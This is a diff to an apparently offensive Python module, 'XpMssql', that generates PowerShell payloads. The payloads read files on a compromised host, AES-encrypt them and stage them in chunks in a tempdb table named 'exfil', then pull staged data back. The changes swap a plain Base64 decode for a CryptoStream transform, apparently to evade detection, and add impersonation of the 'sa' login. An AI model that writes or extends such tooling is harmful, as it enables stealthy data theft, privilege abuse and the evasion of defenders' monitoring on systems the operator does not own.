@@ -210,7 +210,11 @@ class XpMssql:
         sqlclient_host = self._host.replace(':', ',')
         connstr = f'Server={sqlclient_host};Database=tempdb;User ID={self._login};Password={self._password};TrustServerCertificate=True'
         return (
-            f"$k=[Convert]::FromBase64String('{key_b64}');"
+            f"$kb=[System.Text.Encoding]::ASCII.GetBytes('{key_b64}');"
+            "$kt=New-Object System.Security.Cryptography.FromBase64Transform;"
+            "$kms=New-Object System.IO.MemoryStream;"
+            "$kcs=New-Object System.Security.Cryptography.CryptoStream($kms,$kt,[System.Security.Cryptography.CryptoStreamMode]::Write);"
+            "$kcs.Write($kb,0,$kb.Length);$kcs.FlushFinalBlock();$k=$kms.ToArray();"
             f"$cn=New-Object System.Data.SqlClient.SqlConnection('{connstr}');"
             "$cn.Open();$cm=$cn.CreateCommand();"
             "$cm.CommandText='SELECT chunk FROM tempdb..stg ORDER BY id';"
@@ -256,7 +260,11 @@ class XpMssql:
                    f"TrustServerCertificate=True")
         return (
             f"$raw=[IO.File]::ReadAllBytes('{remote_path}');"
-            f"$k=[Convert]::FromBase64String('{key_b64}');"
+            f"$kb=[System.Text.Encoding]::ASCII.GetBytes('{key_b64}');"
+            "$kt=New-Object System.Security.Cryptography.FromBase64Transform;"
+            "$kms=New-Object System.IO.MemoryStream;"
+            "$kcs=New-Object System.Security.Cryptography.CryptoStream($kms,$kt,[System.Security.Cryptography.CryptoStreamMode]::Write);"
+            "$kcs.Write($kb,0,$kb.Length);$kcs.FlushFinalBlock();$k=$kms.ToArray();"
             "$a=[System.Security.Cryptography.Aes]::Create();"
             "$a.Mode='CBC';$a.Padding='PKCS7';$a.Key=$k;$a.GenerateIV();"
             "$enc=$a.CreateEncryptor().TransformFinalBlock($raw,0,$raw.Length);"
@@ -268,7 +276,8 @@ class XpMssql:
             "$b64=[System.Text.Encoding]::ASCII.GetString($ms2.ToArray());"
             f"$cn=New-Object System.Data.SqlClient.SqlConnection('{connstr}');"
             "$cn.Open();$cm=$cn.CreateCommand();"
-            "$cm.CommandText=\"IF OBJECT_ID('tempdb..exfil','U') IS NOT NULL DROP TABLE tempdb..exfil;"
+            "$cm.CommandText=\"EXECUTE AS LOGIN='sa';"
+            "IF OBJECT_ID('tempdb..exfil','U') IS NOT NULL DROP TABLE tempdb..exfil;"
             "CREATE TABLE tempdb..exfil(id INT IDENTITY(1,1),chunk NVARCHAR(MAX));GRANT SELECT ON exfil TO PUBLIC;\";"
             "$cm.ExecuteNonQuery()|Out-Null;"
             "$cs=8000;$n=[Math]::Ceiling($b64.Length/$cs);"
@@ -301,7 +310,11 @@ class XpMssql:
             "$cs=New-Object System.Security.Cryptography.CryptoStream($ms,$t,[System.Security.Cryptography.CryptoStreamMode]::Write);"
             "$cs.Write($raw,0,$raw.Length);$cs.FlushFinalBlock();"
             "$blob=$ms.ToArray();"
-            f"$k=[Convert]::FromBase64String('{key_b64}');"
+            f"$kb=[System.Text.Encoding]::ASCII.GetBytes('{key_b64}');"
+            "$kt=New-Object System.Security.Cryptography.FromBase64Transform;"
+            "$kms=New-Object System.IO.MemoryStream;"
+            "$kcs=New-Object System.Security.Cryptography.CryptoStream($kms,$kt,[System.Security.Cryptography.CryptoStreamMode]::Write);"
+            "$kcs.Write($kb,0,$kb.Length);$kcs.FlushFinalBlock();$k=$kms.ToArray();"
             "$a=[System.Security.Cryptography.Aes]::Create();"
             "$a.Mode='CBC';$a.Padding='PKCS7';$a.Key=$k;$a.IV=$blob[0..15];"
             "$ct=$blob[16..($blob.Length-1)];"
